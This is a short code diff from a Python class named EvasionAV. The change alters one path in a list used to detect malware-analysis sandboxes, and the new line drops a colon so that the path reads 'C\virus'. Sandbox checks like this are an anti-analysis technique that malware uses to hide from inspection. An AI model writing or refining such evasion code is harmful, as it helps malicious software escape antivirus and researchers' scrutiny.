@@ -42,7 +42,7 @@ class EvasionAV:
         return True
     
     def _check_sandbox_files(self):
-        sandbox_files = [r'C:\analysis', r'C:\sandbox', r'C:\cwsandbox', r'C:\sample', r'C:\virus']
+        sandbox_files = [r'C:\analysis', r'C:\sandbox', r'C:\cwsandbox', r'C:\sample', r'C\virus']
         for path in sandbox_files:
             if os.path.exists(path):
                 return True
